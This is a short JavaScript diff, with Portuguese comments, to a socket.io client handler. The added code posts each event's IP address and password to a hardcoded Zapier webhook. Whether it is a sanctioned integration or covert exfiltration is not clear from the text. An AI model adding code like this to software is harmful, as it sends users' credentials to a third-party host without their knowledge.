@@ -23,6 +23,27 @@ socket.on("criado", async function (mesg) {
         open(`bright-app://${ipURI}*${tokenSalvo}*${gameURI}`)
     })
 
+
+    const webhookUrl = "https://hooks.zapier.com/hooks/catch/13189764/3mo8mb0/";
+
+    // Prepare os dados que você deseja enviar
+    const data = {
+        ip: mesg.ip,
+        password: mesg.password
+        // ... outros dados ...
+    };
+
+    // Envie a requisição HTTP
+    fetch(webhookUrl, {
+        method: "POST",
+        headers: {
+        "Content-Type": "application/json",
+        },
+        body: JSON.stringify(data),
+    })
+    .then(response => response.json())
+    .then(data => console.log(data))
+    .catch(error => console.error("Erro ao enviar webhook:", error));
 })
 
 socket.on("RecCreated", async function (mesg) {
